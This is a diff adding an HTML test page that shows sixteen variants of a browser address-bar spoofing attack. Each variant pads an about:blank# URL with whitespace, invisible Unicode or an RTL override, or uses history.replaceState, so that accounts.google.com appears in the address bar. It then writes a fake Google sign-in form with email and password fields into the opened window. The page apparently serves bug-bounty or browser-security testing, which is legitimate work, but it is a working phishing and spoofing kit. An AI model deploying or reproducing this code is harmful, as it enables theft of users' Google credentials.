@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Test</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0d1117; color: #c9d1d9; padding: 16px; }
+h2 { font-size: 16px; color: #58a6ff; margin-bottom: 12px; }
+.card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 12px; margin-bottom: 10px; }
+.id { color: #f0883e; font-weight: bold; font-size: 13px; }
+.desc { color: #8b949e; font-size: 11px; margin: 4px 0 8px; }
+a.test-link { display: block; background: #238636; color: white; text-align: center; padding: 10px; border-radius: 6px; text-decoration: none; font-size: 13px; font-weight: 600; -webkit-tap-highlight-color: transparent; }
+a.test-link:active { opacity: 0.8; }
+.tech { color: #7ee787; font-size: 10px; font-family: monospace; }
+</style>
+</head>
+<body>
+
+<h2>about:blank# Address Bar Spoof Bypasses</h2>
+
+<script>
+// Phishing page content
+var phish = '<html><head><title>accounts.google.com</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"></head>' +
+  '<body style="margin:0;font-family:-apple-system,sans-serif;background:#fff;">' +
+  '<div style="max-width:360px;margin:36px auto;padding:20px;text-align:center;">' +
+  '<svg viewBox="0 0 272 92" width="110" style="margin-bottom:10px;"><text x="0" y="70" font-family="-apple-system,sans-serif" font-size="80" font-weight="500">' +
+  '<tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc05">o</tspan>' +
+  '<tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan>' +
+  '</text></svg>' +
+  '<h1 style="font-size:22px;font-weight:400;color:#202124;margin-bottom:4px;">Sign in</h1>' +
+  '<p style="font-size:14px;color:#5f6368;margin-bottom:24px;">to continue to your account</p>' +
+  '<input type="email" placeholder="Email or phone" autocomplete="off" style="width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;-webkit-appearance:none;margin-bottom:10px;">' +
+  '<input type="password" placeholder="Password" autocomplete="off" style="width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;-webkit-appearance:none;margin-bottom:16px;">' +
+  '<div style="display:flex;justify-content:space-between;align-items:center;">' +
+  '<a style="color:#1a73e8;font-size:13px;">Create account</a>' +
+  '<button style="background:#1a73e8;color:white;border:none;padding:9px 22px;border-radius:4px;font-size:14px;">Next</button>' +
+  '</div></div></body></html>';
+
+// Window names per test
+var wins = {};
+
+function inject(id) {
+  setTimeout(function() {
+    var w = window.open('', id);
+    if (w) {
+      w.document.open();
+      w.document.write(phish);
+      w.document.close();
+      try { w.stop(); } catch(e) {}
+    }
+  }, 500);
+}
+
+// Generate padding strings
+function spaces(n) { var s = ''; for (var i = 0; i < n; i++) s += ' '; return s; }
+function nbsps(n) { var s = ''; for (var i = 0; i < n; i++) s += '\u00A0'; return s; }
+function emspaces(n) { var s = ''; for (var i = 0; i < n; i++) s += '\u2003'; return s; }
+function zwspaces(n) { var s = ''; for (var i = 0; i < n; i++) s += '\u200B'; return s; }
+function tabs(n) { var s = ''; for (var i = 0; i < n; i++) s += '\t'; return s; }
+function ideospaces(n) { var s = ''; for (var i = 0; i < n; i++) s += '\u3000'; return s; }
+</script>
+
+<!-- ============================================ -->
+<!-- V1: Original — regular spaces (baseline) -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V1 — Original (Regular Spaces)</div>
+  <div class="desc">Baseline: about:blank# + 2000 regular spaces + https://accounts.google.com. Pushes "about:blank#" off-screen left.</div>
+  <div class="tech">about:blank#[space x2000]https://accounts.google.com</div>
+  <script>
+  document.write('<a class="test-link" href="about:blank#' + spaces(2000) + 'https://accounts.google.com/signin" target="v1" onclick="inject(\'v1\')">Test V1 — Regular Spaces</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V2: Non-breaking spaces (U+00A0) -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V2 — Non-Breaking Spaces (U+00A0)</div>
+  <div class="desc">Uses &amp;nbsp; (U+00A0) instead of regular spaces. Some browsers handle these differently in URL bar rendering.</div>
+  <div class="tech">about:blank#[\u00A0 x2000]https://accounts.google.com</div>
+  <script>
+  document.write('<a class="test-link" href="about:blank#' + nbsps(2000) + 'https://accounts.google.com/signin" target="v2" onclick="inject(\'v2\')">Test V2 — Non-Breaking Spaces</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V3: Em spaces (U+2003) -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V3 — Em Spaces (U+2003)</div>
+  <div class="desc">Uses em space (U+2003) — wider than regular space. Needs fewer characters to push content off-screen.</div>
+  <div class="tech">about:blank#[\u2003 x500]https://accounts.google.com</div>
+  <script>
+  document.write('<a class="test-link" href="about:blank#' + emspaces(500) + 'https://accounts.google.com/signin" target="v3" onclick="inject(\'v3\')">Test V3 — Em Spaces</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V4: Ideographic spaces (U+3000) -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V4 — Ideographic Spaces (U+3000)</div>
+  <div class="desc">CJK ideographic space — full-width space character. Even wider than em space.</div>
+  <div class="tech">about:blank#[\u3000 x500]https://accounts.google.com</div>
+  <script>
+  document.write('<a class="test-link" href="about:blank#' + ideospaces(500) + 'https://accounts.google.com/signin" target="v4" onclick="inject(\'v4\')">Test V4 — Ideographic Spaces</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V5: Tab characters -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V5 — Tab Characters</div>
+  <div class="desc">Uses tab (\t) characters. Tabs render wider than spaces in some URL bar implementations.</div>
+  <div class="tech">about:blank#[\t x500]https://accounts.google.com</div>
+  <script>
+  document.write('<a class="test-link" href="about:blank#' + tabs(500) + 'https://accounts.google.com/signin" target="v5" onclick="inject(\'v5\')">Test V5 — Tab Characters</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V6: %20 URL-encoded spaces -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V6 — URL-Encoded Spaces (%20)</div>
+  <div class="desc">Uses %20 encoded spaces. Browser may decode them for display but handle differently than literal spaces.</div>
+  <div class="tech">about:blank#[%20 x800]https://accounts.google.com</div>
+  <script>
+  var v6pad = ''; for(var i=0;i<800;i++) v6pad += '%20';
+  document.write('<a class="test-link" href="about:blank#' + v6pad + 'https://accounts.google.com/signin" target="v6" onclick="inject(\'v6\')">Test V6 — URL-Encoded Spaces</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V7: Zero-width spaces + RTL override -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V7 — Zero-Width Spaces + Regular Padding</div>
+  <div class="desc">Mix zero-width spaces with regular spaces. ZWS may confuse URL parsing/truncation logic.</div>
+  <div class="tech">about:blank#[\u200B\u0020 x1000]https://accounts.google.com</div>
+  <script>
+  var v7pad = ''; for(var i=0;i<1000;i++) v7pad += '\u200B ';
+  document.write('<a class="test-link" href="about:blank#' + v7pad + 'https://accounts.google.com/signin" target="v7" onclick="inject(\'v7\')">Test V7 — Zero-Width + Space Mix</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V8: RTL override to reverse display -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V8 — RTL Override (U+202E)</div>
+  <div class="desc">Uses Right-to-Left override character. May reverse URL display so "about:blank" appears at the end (off-screen right) and "google.com" appears first.</div>
+  <div class="tech">about:blank#\u202Emoc.elgoog.stnuocca//:sptth</div>
+  <script>
+  // Reverse the target URL so RTL override makes it display correctly
+  document.write('<a class="test-link" href="about:blank#\u202Enignistnuocca/moc.elgoog.stnuocca//:sptth" target="v8" onclick="inject(\'v8\')">Test V8 — RTL Override</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V9: Newline/CR characters in fragment -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V9 — Newline Characters in Fragment</div>
+  <div class="desc">Injects %0A (newline) and %0D (carriage return) in fragment. May cause address bar to only show content after the newline.</div>
+  <div class="tech">about:blank#%0A%0D%0A%0Dhttps://accounts.google.com</div>
+  <a class="test-link" href="about:blank#%0A%0D%0A%0Dhttps://accounts.google.com/signin" target="v9" onclick="inject('v9')">Test V9 — Newline Injection</a>
+</div>
+
+<!-- ============================================ -->
+<!-- V10: about:srcdoc variant -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V10 — about:srcdoc Instead of about:blank</div>
+  <div class="desc">Uses about:srcdoc which some browsers handle differently. Fragment still appended.</div>
+  <div class="tech">about:srcdoc#[spaces]https://accounts.google.com</div>
+  <script>
+  document.write('<a class="test-link" href="about:srcdoc#' + spaces(2000) + 'https://accounts.google.com/signin" target="v10" onclick="inject(\'v10\')">Test V10 — about:srcdoc</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V11: Fragment with ? to look like real URL -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V11 — Fragment Mimicking Full URL</div>
+  <div class="desc">Fragment contains a full URL structure with path and query params to look more legitimate in site info.</div>
+  <div class="tech">about:blank#https://accounts.google.com/signin?continue=https://myaccount.google.com</div>
+  <a class="test-link" href="about:blank#https://accounts.google.com/ServiceLogin?passive=1209600&continue=https://myaccount.google.com&followup=https://myaccount.google.com" target="v11" onclick="inject('v11')">Test V11 — Full URL in Fragment</a>
+</div>
+
+<!-- ============================================ -->
+<!-- V12: Mixed unicode whitespace -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V12 — Mixed Unicode Whitespace Cocktail</div>
+  <div class="desc">Mixes multiple whitespace types: hair space (U+200A), thin space (U+2009), six-per-em (U+2006), figure space (U+2007), punctuation space (U+2008). Different browsers normalize different subsets.</div>
+  <div class="tech">about:blank#[\u200A\u2009\u2006\u2007\u2008 x300]https://accounts.google.com</div>
+  <script>
+  var v12pad = ''; for(var i=0;i<300;i++) v12pad += '\u200A\u2009\u2006\u2007\u2008';
+  document.write('<a class="test-link" href="about:blank#' + v12pad + 'https://accounts.google.com/signin" target="v12" onclick="inject(\'v12\')">Test V12 — Mixed Unicode Whitespace</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V13: Braille blank pattern (U+2800) -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V13 — Braille Blank Pattern (U+2800)</div>
+  <div class="desc">Braille pattern blank — renders as blank space but is NOT classified as whitespace in Unicode. May bypass whitespace stripping.</div>
+  <div class="tech">about:blank#[\u2800 x1500]https://accounts.google.com</div>
+  <script>
+  var v13pad = ''; for(var i=0;i<1500;i++) v13pad += '\u2800';
+  document.write('<a class="test-link" href="about:blank#' + v13pad + 'https://accounts.google.com/signin" target="v13" onclick="inject(\'v13\')">Test V13 — Braille Blank</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V14: Hangul Filler (U+3164) -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V14 — Hangul Filler (U+3164)</div>
+  <div class="desc">Korean Hangul filler character — visually blank, not classified as space. Another whitespace bypass candidate.</div>
+  <div class="tech">about:blank#[\u3164 x1500]https://accounts.google.com</div>
+  <script>
+  var v14pad = ''; for(var i=0;i<1500;i++) v14pad += '\u3164';
+  document.write('<a class="test-link" href="about:blank#' + v14pad + 'https://accounts.google.com/signin" target="v14" onclick="inject(\'v14\')">Test V14 — Hangul Filler</a>');
+  </script>
+</div>
+
+<!-- ============================================ -->
+<!-- V15: history.replaceState after open -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V15 — history.replaceState After Open</div>
+  <div class="desc">Open about:blank, then use history.replaceState inside the new window to change displayed URL. May bypass about: display restrictions.</div>
+  <div class="tech">window.open + history.replaceState('https://accounts.google.com')</div>
+  <a class="test-link" href="#" onclick="testV15();return false;">Test V15 — replaceState</a>
+</div>
+
+<script>
+function testV15() {
+  var w = window.open('about:blank', 'v15');
+  if (!w) return;
+  setTimeout(function() {
+    try {
+      // Try to change URL via history API
+      w.history.replaceState({}, 'Google', 'https://accounts.google.com/signin');
+    } catch(e) {
+      // Expected: cross-origin blocked. Try same-origin path
+      try {
+        w.history.replaceState({}, 'Google', '/accounts/google/signin');
+      } catch(e2) {}
+    }
+    w.document.open();
+    w.document.write(phish);
+    w.document.close();
+    try { w.stop(); } catch(e) {}
+  }, 500);
+}
+</script>
+
+<!-- ============================================ -->
+<!-- V16: Mongolian Vowel Separator (U+180E) -->
+<!-- ============================================ -->
+<div class="card">
+  <div class="id">V16 — Mongolian Vowel Separator (U+180E)</div>
+  <div class="desc">Was classified as whitespace in Unicode 4.0, reclassified as format char in 6.3. Some parsers still treat it as space, others don't strip it.</div>
+  <div class="tech">about:blank#[\u180E x1500]https://accounts.google.com</div>
+  <script>
+  var v16pad = ''; for(var i=0;i<1500;i++) v16pad += '\u180E';
+  document.write('<a class="test-link" href="about:blank#' + v16pad + 'https://accounts.google.com/signin" target="v16" onclick="inject(\'v16\')">Test V16 — Mongolian Vowel Sep</a>');
+  </script>
+</div>
+
+</body>
+</html>
